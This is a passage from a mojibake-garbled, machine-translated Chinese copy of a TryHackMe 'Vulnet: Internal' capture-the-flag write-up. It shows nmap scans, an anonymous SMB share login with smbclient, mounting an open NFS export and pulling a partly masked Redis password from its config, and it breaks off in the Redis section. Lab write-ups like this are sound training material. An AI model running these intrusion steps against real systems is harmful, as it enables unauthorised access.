<html>
<head>
<title>TryHackMe Writeupâ€” Vulnet: Internal</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">TryHackMe write up-Vulnet:å†…éƒ¨</h1>
<blockquote>åŸæ–‡ï¼š<a href="https://infosecwriteups.com/tryhackme-writeup-vulnet-internal-9abe74955f32?source=collection_archive---------2-----------------------#2021-06-13">https://infosecwriteups.com/tryhackme-writeup-vulnet-internal-9abe74955f32?source=collection_archive---------2-----------------------#2021-06-13</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><p id="c26b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">æœ¬æ–‡ä»‹ç»äº†æˆ‘è§£å†³<strong class="jp ir"> Vulnetçš„æ–¹æ³•:å†…éƒ¨</strong>å¤ºæ——(CTF) <strong class="jp ir"> </strong>æŒ‘æˆ˜ï¼Œ<strong class="jp ir"> </strong>ç”¨æˆ·åˆ›å»ºçš„TryHackMeå¹³å°ä¸Šå¯ç”¨çš„å…è´¹æˆ¿é—´<em class="kl"> TheCyb3rW0lf </em>ã€‚æˆ‘åœ¨ä¸‹é¢çš„å‚è€ƒèµ„æ–™ä¸­æä¾›äº†TryHackMeå¹³å°çš„é“¾æ¥ï¼Œä¾›æœ‰å…´è¶£å°è¯•è¿™æ¬¾CTFçš„äººä½¿ç”¨ã€‚</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div class="gh gi km"><img src="../Images/4ff4ab87f84e81cc01e90457dc7738f6.png" data-original-src="https://miro.medium.com/v2/resize:fit:858/format:webp/1*RSD0Ep_i5hiHSVArGjG9yQ.png"/></div></figure></div><div class="ab cl ku kv hu kw" role="separator"><span class="kx bw bk ky kz la"/><span class="kx bw bk ky kz la"/><span class="kx bw bk ky kz"/></div><div class="ij ik il im in"><h1 id="8da4" class="lb lc iq bd ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly bi translated">æ”¾å¼ƒ</h1><p id="d8dd" class="pw-post-body-paragraph jn jo iq jp b jq lz js jt ju ma jw jx jy mb ka kb kc mc ke kf kg md ki kj kk ij bi translated">æˆ‘å–œæ¬¢åœ¨ä¸€ç¯‡æ–‡ç« ä¹‹å‰æ·»åŠ ä¸€ä¸ªç®€çŸ­çš„å…è´£å£°æ˜ï¼Œä»¥é¼“åŠ±äººä»¬åœ¨é˜…è¯»æœ¬æ–‡ä¹‹å‰å°è¯•ä¸€ä¸‹è¿™ä¸ªæˆ¿é—´ï¼Œå› ä¸ºåœ¨è¿™ç¯‡æ–‡ç« ä¸­æ˜¾ç„¶ä¼šæœ‰<strong class="jp ir">å‰§é€</strong><strong class="jp ir"/>ã€‚æˆ‘ç›¸ä¿¡ï¼Œå¦‚æœä½ å…ˆè‡ªå·±å°è¯•ï¼Œç„¶ååœ¨é‡åˆ°å›°éš¾æˆ–éœ€è¦æç¤ºæ—¶å†æ¥å†™è¿™ç¯‡æ–‡ç« ï¼Œä½ ä¼šæ›´å–œæ¬¢CTFã€‚å› æ­¤ï¼Œæ²¡æœ‰ä»»ä½•è¿›ä¸€æ­¥çš„æ‹–å»¶ï¼Œè®©æˆ‘ä»¬å¼€å§‹å§ï¼</p></div><div class="ab cl ku kv hu kw" role="separator"><span class="kx bw bk ky kz la"/><span class="kx bw bk ky kz la"/><span class="kx bw bk ky kz"/></div><div class="ij ik il im in"><h1 id="8ed5" class="lb lc iq bd ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly bi translated">æŒ‘æˆ˜ç®€ä»‹</h1><p id="1c9a" class="pw-post-body-paragraph jn jo iq jp b jq lz js jt ju ma jw jx jy mb ka kb kc mc ke kf kg md ki kj kk ij bi translated">ä»¥ä¸‹æè¿°ç”±æˆ¿é—´ä½œè€…æä¾›:</p><blockquote class="me mf mg"><p id="1f35" class="jn jo kl jp b jq jr js jt ju jv jw jx mh jz ka kb mi kd ke kf mj kh ki kj kk ij bi translated">VulnNet Entertainmentæ˜¯ä¸€å®¶ä»é”™è¯¯ä¸­å¸å–æ•™è®­çš„å…¬å¸ã€‚ä»–ä»¬å¾ˆå¿«æ„è¯†åˆ°ä»–ä»¬ä¸èƒ½å¼€å‘ä¸€ä¸ªå®‰å…¨çš„webåº”ç”¨ç¨‹åºï¼Œæ‰€ä»¥ä»–ä»¬æ”¾å¼ƒäº†è¿™ä¸ªæƒ³æ³•ã€‚ç›¸åï¼Œä»–ä»¬å†³å®šä¸ºå•†ä¸šç›®çš„å»ºç«‹å†…éƒ¨æœåŠ¡ã€‚åƒå¾€å¸¸ä¸€æ ·ï¼Œä½ çš„ä»»åŠ¡æ˜¯å¯¹ä»–ä»¬çš„ç½‘ç»œè¿›è¡Œæ¸—é€æµ‹è¯•ï¼Œå¹¶æŠ¥å‘Šä½ çš„å‘ç°ã€‚</p></blockquote><p id="97b0" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">è¦å®ŒæˆæŒ‘æˆ˜ï¼Œéœ€è¦æäº¤å››é¢æ——å¸œ:</p><ul class=""><li id="dcc0" class="mk ml iq jp b jq jr ju jv jy mm kc mn kg mo kk mp mq mr ms bi translated"><strong class="jp ir">æœåŠ¡æ ‡å¿—</strong></li><li id="6635" class="mk ml iq jp b jq mt ju mu jy mv kc mw kg mx kk mp mq mr ms bi translated"><strong class="jp ir">å†…éƒ¨æ ‡å¿—</strong></li><li id="9425" class="mk ml iq jp b jq mt ju mu jy mv kc mw kg mx kk mp mq mr ms bi translated"><strong class="jp ir">ç”¨æˆ·æ ‡å¿—</strong></li><li id="5609" class="mk ml iq jp b jq mt ju mu jy mv kc mw kg mx kk mp mq mr ms bi translated"><strong class="jp ir">æ ¹æ ‡å¿—</strong></li></ul></div><div class="ab cl ku kv hu kw" role="separator"><span class="kx bw bk ky kz la"/><span class="kx bw bk ky kz la"/><span class="kx bw bk ky kz"/></div><div class="ij ik il im in"><h1 id="8f30" class="lb lc iq bd ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly bi translated">åˆ—ä¸¾</h1><p id="e906" class="pw-post-body-paragraph jn jo iq jp b jq lz js jt ju ma jw jx jy mb ka kb kc mc ke kf kg md ki kj kk ij bi translated">æˆ‘å¼€å§‹ç”¨NMAPæ‰«ææ‰€æœ‰æ‰“å¼€çš„ç«¯å£æ¥æšä¸¾ç›®æ ‡æœºå™¨:</p><pre class="kn ko kp kq gt my mz na nb aw nc bi"><span id="02a9" class="nd lc iq mz b gy ne nf l ng nh">nmap -T5 --open -sS -vvv --min-rate=300 --max-retries=3 -p- -oN all-ports-nmap-report 10.10.199.12</span><span id="8a94" class="nd lc iq mz b gy ni nf l ng nh">PORT      STATE SERVICE      REASON<br/>22/tcp    open  ssh          syn-ack ttl 61<br/>111/tcp   open  rpcbind      syn-ack ttl 61<br/>139/tcp   open  netbios-ssn  syn-ack ttl 61<br/>445/tcp   open  microsoft-ds syn-ack ttl 61<br/>873/tcp   open  rsync        syn-ack ttl 61<br/>2049/tcp  open  nfs          syn-ack ttl 61<br/>6379/tcp  open  redis        syn-ack ttl 61<br/>40031/tcp open  unknown      syn-ack ttl 61<br/>40423/tcp open  unknown      syn-ack ttl 61<br/>44823/tcp open  unknown      syn-ack ttl 61<br/>53943/tcp open  unknown      syn-ack ttl 61</span></pre><p id="251c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">æˆ‘å¯ä»¥çœ‹åˆ°æ‰«æå‘ç°ç›¸å½“å¤šçš„ç«¯å£æ˜¯å¼€æ”¾çš„ã€‚æ¥ä¸‹æ¥ï¼Œæˆ‘ä½¿ç”¨NMAPæ‰«æè¿è¡Œåœ¨è¿™äº›ç«¯å£å’ŒNMAPè„šæœ¬ä¸Šçš„æœåŠ¡ï¼Œä»¥æ‰¾åˆ°ä»»ä½•å¸¸è§çš„æ¼æ´:</p><pre class="kn ko kp kq gt my mz na nb aw nc bi"><span id="4875" class="nd lc iq mz b gy ne nf l ng nh">nmap -sV -sC -Pn -v -p 22, 111, 139, 445, 873, 2049, 6379, 40031, 40423, 44823, 53943 -oN nmap-report 10.10.199.12</span><span id="68e5" class="nd lc iq mz b gy ni nf l ng nh">PORT      STATE SERVICE     VERSION<br/>22/tcp    open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)<br/>| ssh-hostkey: <br/>|   2048 5e:27:8f:48:ae:2f:f8:89:bb:89:13:e3:9a:fd:63:40 (RSA)<br/>|   256 f4:fe:0b:e2:5c:88:b5:63:13:85:50:dd:d5:86:ab:bd (ECDSA)<br/>|_  256 82:ea:48:85:f0:2a:23:7e:0e:a9:d9:14:0a:60:2f:ad (ED25519)<br/>111/tcp   open  rpcbind     2-4 (RPC #100000)<br/>| rpcinfo: <br/>|   program version    port/proto  service<br/>|   100000  2,3,4        111/tcp   rpcbind<br/>|   100000  2,3,4        111/udp   rpcbind<br/>|   100000  3,4          111/tcp6  rpcbind<br/>|   100000  3,4          111/udp6  rpcbind<br/>|   100003  3           2049/udp   nfs<br/>|   100003  3           2049/udp6  nfs<br/>|   100003  3,4         2049/tcp   nfs<br/>|   100003  3,4         2049/tcp6  nfs<br/>|   100005  1,2,3      45711/tcp6  mountd<br/>|   100005  1,2,3      47302/udp6  mountd<br/>|   100005  1,2,3      53649/udp   mountd<br/>|   100005  1,2,3      53943/tcp   mountd<br/>|   100021  1,3,4      32783/tcp6  nlockmgr<br/>|   100021  1,3,4      38136/udp   nlockmgr<br/>|   100021  1,3,4      40423/tcp   nlockmgr<br/>|   100021  1,3,4      41624/udp6  nlockmgr<br/>|   100227  3           2049/tcp   nfs_acl<br/>|   100227  3           2049/tcp6  nfs_acl<br/>|   100227  3           2049/udp   nfs_acl<br/>|_  100227  3           2049/udp6  nfs_acl<br/>139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)<br/>445/tcp   open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)<br/>873/tcp   open  rsync       (protocol version 31)<br/>2049/tcp  open  nfs_acl     3 (RPC #100227)<br/>6379/tcp  open  redis       Redis key-value store<br/>40031/tcp open  java-rmi    Java RMI<br/>40423/tcp open  nlockmgr    1-4 (RPC #100021)<br/>44823/tcp open  mountd      1-3 (RPC #100005)<br/>53943/tcp open  mountd      1-3 (RPC #100005)<br/>Service Info: Host: VULNNET-INTERNAL; OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><span id="fe62" class="nd lc iq mz b gy ni nf l ng nh">Host script results:<br/>|_clock-skew: mean: -39m59s, deviation: 1h09m16s, median: 0s<br/>| nbstat: NetBIOS name: VULNNET-INTERNA, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)<br/>| Names:<br/>|   VULNNET-INTERNA&lt;00&gt;  Flags: &lt;unique&gt;&lt;active&gt;<br/>|   VULNNET-INTERNA&lt;03&gt;  Flags: &lt;unique&gt;&lt;active&gt;<br/>|   VULNNET-INTERNA&lt;20&gt;  Flags: &lt;unique&gt;&lt;active&gt;<br/>|   WORKGROUP&lt;00&gt;        Flags: &lt;group&gt;&lt;active&gt;<br/>|_  WORKGROUP&lt;1e&gt;        Flags: &lt;group&gt;&lt;active&gt;<br/>| smb-os-discovery: <br/>|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)<br/>|   Computer name: vulnnet-internal<br/>|   NetBIOS computer name: VULNNET-INTERNAL\x00<br/>|   Domain name: \x00<br/>|   FQDN: vulnnet-internal<br/>|_  System time: 2021-06-13T13:24:53+02:00<br/>| smb-security-mode: <br/>|   account_used: guest<br/>|   authentication_level: user<br/>|   challenge_response: supported<br/>|_  message_signing: disabled (dangerous, but default)<br/>| smb2-security-mode: <br/>|   2.02: <br/>|_    Message signing enabled but not required<br/>| smb2-time: <br/>|   date: 2021-06-13T11:24:53<br/>|_  start_date: N/A</span></pre><p id="2a5f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">ä¸€æ—¦NMAPæ‰«æå®Œæˆï¼Œæˆ‘å¯ä»¥çœ‹åˆ°å¾ˆå¤šæœåŠ¡ä¿¡æ¯è¢«è¿”å›ã€‚ä»è¿™é‡Œå¼€å§‹ï¼Œæˆ‘å¼€å§‹å…³æ³¨æ¯ä¸ªå•ç‹¬çš„æœåŠ¡ï¼Œå¹¶æ‰¾åˆ°ç¬¬ä¸€ä¸ªæ ‡å¿—ã€‚</p></div><div class="ab cl ku kv hu kw" role="separator"><span class="kx bw bk ky kz la"/><span class="kx bw bk ky kz la"/><span class="kx bw bk ky kz"/></div><div class="ij ik il im in"><h1 id="4f68" class="lb lc iq bd ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly bi translated">ç«¯å£139å’Œ445 â€”ä¸­å°å‹ä¼ä¸š</h1><p id="0924" class="pw-post-body-paragraph jn jo iq jp b jq lz js jt ju ma jw jx jy mb ka kb kc mc ke kf kg md ki kj kk ij bi translated">ä¸ºäº†æ‰¾åˆ°ç¬¬ä¸€ä¸ªæ ‡å¿—ï¼Œæˆ‘å¼€å§‹ç”¨<strong class="jp ir"> enum4linux: </strong>æ‰§è¡ŒSMBæšä¸¾</p><pre class="kn ko kp kq gt my mz na nb aw nc bi"><span id="62d4" class="nd lc iq mz b gy ne nf l ng nh">$ enum4linux -a 10.10.199.29</span><span id="eca0" class="nd lc iq mz b gy ni nf l ng nh">===================================== <br/>|    Session Check on 10.10.199.12    |<br/> ===================================== <br/>[+] Server 10.10.199.12 allows sessions using username '', password ''</span><span id="e48c" class="nd lc iq mz b gy ni nf l ng nh">========================================= <br/>|    Share Enumeration on 10.10.199.12    |<br/> ========================================= <br/>directory_create_or_exist: mkdir failed on directory /run/samba/msg.lock: Permission denied<br/>Unable to initialize messaging context</span><span id="db5b" class="nd lc iq mz b gy ni nf l ng nh">        Sharename       Type      Comment<br/>        ---------       ----      -------<br/>        print$          Disk      Printer Drivers<br/>        shares          Disk      VulnNet Business Shares<br/>        IPC$            IPC       IPC Service (vulnnet-internal server (Samba, Ubuntu))<br/>Reconnecting with SMB1 for workgroup listing.</span><span id="689e" class="nd lc iq mz b gy ni nf l ng nh">        Server               Comment<br/>        ---------            -------</span><span id="cc8f" class="nd lc iq mz b gy ni nf l ng nh">        Workgroup            Master<br/>        ---------            -------<br/>        WORKGROUP</span><span id="e4fb" class="nd lc iq mz b gy ni nf l ng nh">[+] Attempting to map shares on 10.10.199.12<br/>//10.10.199.12/print$   Mapping: DENIED, Listing: N/A<br/>//10.10.199.12/shares   Mapping: OK, Listing: OK<br/>//10.10.199.12/IPC$     [E] Can't understand response:</span><span id="79c4" class="nd lc iq mz b gy ni nf l ng nh">====================================================================<br/>| Users on 10.10.199.12 via RID cycling (RIDS: 500-550,1000-1050) |<br/>====================================================================</span><span id="a3e8" class="nd lc iq mz b gy ni nf l ng nh">[I] Found new SID: S-1-22-1<br/>[I] Found new SID: S-1-5-21-1569020563-4280465252-527208056<br/>[I] Found new SID: S-1-5-32</span><span id="7e97" class="nd lc iq mz b gy ni nf l ng nh">[+] Enumerating users using SID S-1-5-21-1569020563-4280465252-527208056 and logon username '', password ''<br/>S-1-5-21-1569020563-4280465252-527208056-513 VULNNET-INTERNAL\None (Domain Group)</span><span id="f897" class="nd lc iq mz b gy ni nf l ng nh">[+] Enumerating users using SID S-1-5-32 and logon username '', password ''<br/>S-1-5-32-544 BUILTIN\Administrators (Local Group)<br/>S-1-5-32-545 BUILTIN\Users (Local Group)<br/>S-1-5-32-546 BUILTIN\Guests (Local Group)<br/>S-1-5-32-547 BUILTIN\Power Users (Local Group)<br/>S-1-5-32-548 BUILTIN\Account Operators (Local Group)<br/>S-1-5-32-549 BUILTIN\Server Operators (Local Group)<br/>S-1-5-32-550 BUILTIN\Print Operators (Local Group)</span><span id="1413" class="nd lc iq mz b gy ni nf l ng nh">[+] Enumerating users using SID S-1-22-1 and logon username '', password ''<br/> S-1-22-1-1000 Unix User\sys-internal (Local User)</span></pre><p id="5aba" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">è¯¥å‘½ä»¤è¿”å›äº†å¤§é‡ä¿¡æ¯ã€‚æ ¹æ®ä¸Šé¢çš„è¾“å‡ºï¼Œæˆ‘å¯ä»¥çœ‹åˆ°å­˜åœ¨ä¸€ä¸ª<strong class="jp ir"> SMBç©ºä¼šè¯</strong>æ¼æ´ï¼Œå¹¶ä¸”è¿˜å‘ç°äº†ä¸€ä¸ªåä¸º<strong class="jp ir"> sys-internal </strong>çš„ç”¨æˆ·ã€‚ç©ºä¼šè¯æ¼æ´å…è®¸æˆ‘æ— éœ€æä¾›å¯†ç å³å¯ç™»å½•å…±äº«ã€‚æˆ‘çœ‹åˆ°æœ‰ä¸‰ä¸ªå…±äº«å¯ç”¨ï¼Œä½†æˆ‘åªèƒ½è®¿é—®<strong class="jp ir"><em class="kl">//10 . 10 . 199 . 12/shares</em></strong>å…±äº«ã€‚ä½¿ç”¨<strong class="jp ir"> smbclient </strong>æˆ‘åœ¨æ²¡æœ‰æŒ‡å®šå¯†ç çš„æƒ…å†µä¸‹è®¿é—®äº†å…±äº«ï¼Œå¹¶è·å¾—äº†services.txtæ ‡å¿—:</p><pre class="kn ko kp kq gt my mz na nb aw nc bi"><span id="7888" class="nd lc iq mz b gy ne nf l ng nh">$ smbclient -N //10.10.199.12/shares</span><span id="985f" class="nd lc iq mz b gy ni nf l ng nh">smb: \temp\&gt; get services.txt</span><span id="b219" class="nd lc iq mz b gy ni nf l ng nh">$ cat services.txt <br/>THM{0a09d51e488f5......}</span></pre><p id="f872" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">ä¸€é¢æ——å¸œè½ä¸‹ï¼Œè¿˜æœ‰å››é¢ï¼</p></div><div class="ab cl ku kv hu kw" role="separator"><span class="kx bw bk ky kz la"/><span class="kx bw bk ky kz la"/><span class="kx bw bk ky kz"/></div><div class="ij ik il im in"><h1 id="b879" class="lb lc iq bd ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly bi translated">ç«¯å£2049 â€” nfs_acl</h1><p id="ee44" class="pw-post-body-paragraph jn jo iq jp b jq lz js jt ju ma jw jx jy mb ka kb kc mc ke kf kg md ki kj kk ij bi translated">æŸ¥çœ‹ä¹‹å‰çš„NMAPæœåŠ¡æ‰«æï¼Œæˆ‘çœ‹åˆ°ç«¯å£2049æ˜¯æ‰“å¼€çš„ï¼Œå¹¶æ³¨æ„åˆ°ç«¯å£111æœ‰å¾ˆå¤šè¾“å‡ºã€‚æˆ‘å¯ä»¥åœ¨ç«¯å£111çš„è¾“å‡ºä¸­çœ‹åˆ°ï¼ŒæœåŠ¡<strong class="jp ir"> NFS </strong>å‡ºç°åœ¨è¾“å‡ºä¸­ã€‚è¿™è¡¨æ˜æˆ‘å¯èƒ½èƒ½å¤Ÿåˆ—å‡ºå¹¶ä¸‹è½½(ä¹Ÿå¯èƒ½ä¸Šä¼ )æ–‡ä»¶ã€‚</p><blockquote class="me mf mg"><p id="8768" class="jn jo kl jp b jq jr js jt ju jv jw jx mh jz ka kb mi kd ke kf mj kh ki kj kk ij bi translated"><strong class="jp ir">æ³¨æ„:</strong> NFSæ˜¯ä¸€ç§å®¢æˆ·æœº/æœåŠ¡å™¨ç³»ç»Ÿï¼Œå…è®¸ç”¨æˆ·é€šè¿‡ç½‘ç»œè®¿é—®æ–‡ä»¶ï¼Œå¹¶å°†å…¶è§†ä¸ºé©»ç•™åœ¨æœ¬åœ°æ–‡ä»¶ç›®å½•ä¸­ã€‚</p></blockquote><p id="9718" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">æˆ‘å‘ç°ä»¥ä¸‹é“¾æ¥å¯¹äºäº†è§£å¦‚ä½•åˆ©ç”¨NFSå¾ˆæœ‰ç”¨:</p><div class="nj nk gp gr nl nm"><a href="https://book.hacktricks.xyz/pentesting/nfs-service-pentesting" rel="noopener  ugc nofollow" target="_blank"><div class="nn ab fo"><div class="no ab np cl cj nq"><h2 class="bd ir gy z fp nr fr fs ns fu fw ip bi translated">2049å¹´çš„ä»Šå¤©ï¼Œæµ‹è¯•NFSæœåŠ¡</h2><div class="nt l"><h3 class="bd b gy z fp nr fr fs ns fu fw dk translated">æ¸…å•-æœ¬åœ°Windowsæƒé™æå‡</h3></div><div class="nu l"><p class="bd b dl z fp nr fr fs ns fu fw dk translated">book.hacktricks.xyz</p></div></div><div class="nv l"><div class="nw l nx ny nz nv oa ks nm"/></div></div></a></div><div class="nj nk gp gr nl nm"><a href="https://resources.infosecinstitute.com/topic/exploiting-nfs-share/" rel="noopener  ugc nofollow" target="_blank"><div class="nn ab fo"><div class="no ab np cl cj nq"><h2 class="bd ir gy z fp nr fr fs ns fu fw ip bi translated">åˆ©ç”¨NFSå…±äº«[æ›´æ–°2021] -ä¿¡æ¯å®‰å…¨èµ„æº</h2><div class="nt l"><h3 class="bd b gy z fp nr fr fs ns fu fw dk translated">æœ€è¿‘ï¼Œåœ¨ä¸ºä¸€ä¸ªå®¢æˆ·æ‰§è¡Œç½‘ç»œçº§æ¸—é€æµ‹è¯•æ´»åŠ¨æ—¶ï¼Œæˆ‘é‡åˆ°äº†ä¸€ä¸ªâ€¦</h3></div><div class="nu l"><p class="bd b dl z fp nr fr fs ns fu fw dk translated">resources.infosecinstitute.com</p></div></div><div class="nv l"><div class="ob l nx ny nz nv oa ks nm"/></div></div></a></div><p id="def9" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">æˆ‘å¼€å§‹æšä¸¾ç«¯å£2049ï¼Œä½¿ç”¨<strong class="jp ir"> showmount </strong>å·¥å…·æ£€æŸ¥æ˜¯å¦æœ‰ä»»ä½•å…±äº«å¯ä»¥æŒ‚è½½:</p><pre class="kn ko kp kq gt my mz na nb aw nc bi"><span id="c19b" class="nd lc iq mz b gy ne nf l ng nh">$ sudo showmount -e 10.10.63.208</span><span id="3c4e" class="nd lc iq mz b gy ni nf l ng nh">Export list for 10.10.63.208:<br/>/opt/conf *</span></pre><p id="5776" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir"> <em class="kl"> "/opt/conf" </em> </strong>ç›®å½•æ˜¯å¯æŒ‚è½½çš„ã€‚æ³¨æ„<em class="kl"> /opt/conf </em>å‰é¢çš„<strong class="jp ir">æ˜Ÿå·(*) </strong>ç¬¦å·ï¼Œè¡¨ç¤ºç½‘ç»œä¸Šçš„æ¯å°æœºå™¨éƒ½å¯ä»¥æŒ‚è½½è¯¥æœºå™¨çš„<em class="kl"> /opt/conf </em>æ–‡ä»¶å¤¹ã€‚</p><blockquote class="me mf mg"><p id="1b46" class="jn jo kl jp b jq jr js jt ju jv jw jx mh jz ka kb mi kd ke kf mj kh ki kj kk ij bi translated"><strong class="jp ir">æ³¨æ„:</strong>å¦‚æœæ‚¨çœ‹åˆ°åœ¨ç›®å½•å‰é¢å®šä¹‰äº†ä»»ä½•IPåœ°å€æˆ–IPèŒƒå›´ï¼Œè¿™æ„å‘³ç€åªæœ‰å…·æœ‰è¯¥ç‰¹å®šIPæˆ–èŒƒå›´çš„æœºå™¨æ‰è¢«å…è®¸æŒ‚è½½è¯¥ç›®å½•ï¼Œè¿™æ˜¯ä¸€ç§è‰¯å¥½çš„å®‰å…¨åšæ³•ã€‚</p></blockquote><p id="e477" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">æˆ‘åœ¨æˆ‘çš„Kaliæœºå™¨çš„<em class="kl"> /tmp </em>æ–‡ä»¶å¤¹ä¸‹åˆ›å»ºäº†ä¸€ä¸ªæ–°ç›®å½•ï¼Œå¹¶è¿è¡Œ<strong class="jp ir"> mount </strong>å‘½ä»¤åœ¨è¿™ä¸ªæ–°åˆ›å»ºçš„ç›®å½•ä¸ŠæŒ‚è½½<em class="kl"> /opt/conf </em>ç›®å½•:</p><pre class="kn ko kp kq gt my mz na nb aw nc bi"><span id="ceaa" class="nd lc iq mz b gy ne nf l ng nh">$ mkdir /tmp/infosec</span><span id="c5d5" class="nd lc iq mz b gy ni nf l ng nh">$ mount -t nfs 10.10.63.208:/opt/conf /tmp/infosec</span></pre><p id="14aa" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">ä¸€æ—¦å‘½ä»¤è¢«æ‰§è¡Œï¼Œ<strong class="jp ir"> df </strong>å‘½ä»¤å¯ç”¨äºæ£€æŸ¥ç›®å½•æŒ‚è½½:</p><pre class="kn ko kp kq gt my mz na nb aw nc bi"><span id="3fd2" class="nd lc iq mz b gy ne nf l ng nh">$ df -k</span><span id="aeac" class="nd lc iq mz b gy ni nf l ng nh">Filesystem             1K-blocks     Used Available Use% Mounted on<br/>......<br/>10.10.63.208:/opt/conf  11309824  7436288   3279360  70% /tmp/infosec</span></pre><p id="25e8" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">æˆ‘å¯ä»¥çœ‹åˆ°ç›®å½•å·²ç»è¢«æŒ‚è½½ï¼Œå¹¶ç»§ç»­åˆ—å‡ºç›®å½•çš„å†…å®¹ã€‚é€šè¿‡æŸ¥çœ‹è¾“å‡ºï¼Œæˆ‘å‘ç°äº†Redisçš„ä¸€ä¸ªé…ç½®æ–‡ä»¶:</p><pre class="kn ko kp kq gt my mz na nb aw nc bi"><span id="68f5" class="nd lc iq mz b gy ne nf l ng nh">./redis:<br/>total 68<br/>drwxr-xr-x 2 root root  4096 Feb  2 06:19 .<br/>drwxr-xr-x 9 root root  4096 Feb  2 06:19 ..<br/>-rw-r--r-- 1 root root 58922 Feb  2 06:19 redis.conf &lt;- Interesting!</span></pre></div><div class="ab cl ku kv hu kw" role="separator"><span class="kx bw bk ky kz la"/><span class="kx bw bk ky kz la"/><span class="kx bw bk ky kz"/></div><div class="ij ik il im in"><h1 id="3ebe" class="lb lc iq bd ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly bi translated">ç«¯å£6379 â€” redis</h1><p id="16ac" class="pw-post-body-paragraph jn jo iq jp b jq lz js jt ju ma jw jx jy mb ka kb kc mc ke kf kg md ki kj kk ij bi translated">å‚è€ƒå‰é¢NMAPæ‰«æçš„è¾“å‡ºï¼Œæˆ‘çŸ¥é“redisè¿è¡Œåœ¨ç«¯å£6379ä¸Šã€‚çœ‹ç€<strong class="jp ir"> redis.conf </strong>æ–‡ä»¶ï¼Œå‘ç°äº†ä¸€ä¸ªå¯†ç ã€‚</p><pre class="kn ko kp kq gt my mz na nb aw nc bi"><span id="0019" class="nd lc iq mz b gy ne nf l ng nh">requirepass "B65Hx562...."</span></pre><p id="1fb3" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">é»˜è®¤æƒ…å†µä¸‹ï¼Œå¯ä»¥åœ¨æ²¡æœ‰å‡­æ®çš„æƒ…å†µä¸‹è®¿é—®Redisã€‚ä½†æ˜¯ï¼Œå¯ä»¥å°†å…¶é…ç½®ä¸ºä»…æ”¯æŒå¯†ç ï¼Œæˆ–ç”¨æˆ·å+å¯†ç ã€‚</p><blockquote class="me mf mg"><p id="aec3" class="jn jo kl jp b jq jr js jt ju jv jw jx mh jz ka kb mi kd ke kf mj kh ki kj kk ij bi translated"><strong class="jp ir"> N.B. </strong> Redisæ˜¯ä¸€ä¸ªå¼€æºçš„(BSDè®¸å¯çš„)ã€å†…å­˜ä¸­çš„æ•°æ®ç»“æ„å­˜å‚¨ï¼Œç”¨ä½œæ•°æ®åº“ã€ç¼“å­˜å’Œæ¶ˆæ¯ä»£ç†ã€‚</p></blockquote><p id="ef73" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">æˆ‘å‘ç°ä¸‹é¢çš„èµ„æºå¯¹äºå­¦ä¹ æ›´å¤šå…³äºåˆ©ç”¨redisçš„çŸ¥è¯†å¾ˆæœ‰ç”¨:</p><div class="nj nk gp gr nl nm"><a href="https://book.hacktricks.xyz/pentesting/6379-pentesting-redis" rel="noopener  ugc nofollow" target="_blank"><div class="nn ab fo"><div class="no ab np cl cj nq"><h2 class="bd ir gy z fp nr fr fs ns fu fw ip bi translated">6379 - Pentesting Redis</h2><div class="nt l"><h3 class="bd b gy z fp nr fr fs ns fu fw dk translated">Redisæ˜¯å¼€æºçš„(BSDè®¸å¯)ï¼Œå†…å­˜ä¸­)ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼ŒRedisé€šå¸¸ä½¿ç”¨åŸºäºçº¯æ–‡æœ¬çš„åè®®â€¦</h3></div><div class="nu l"><p class="bd b dl z fp nr fr fs ns fu fw dk translated">book.hacktricks.xyz</p></div></div><div class="nv l"><div 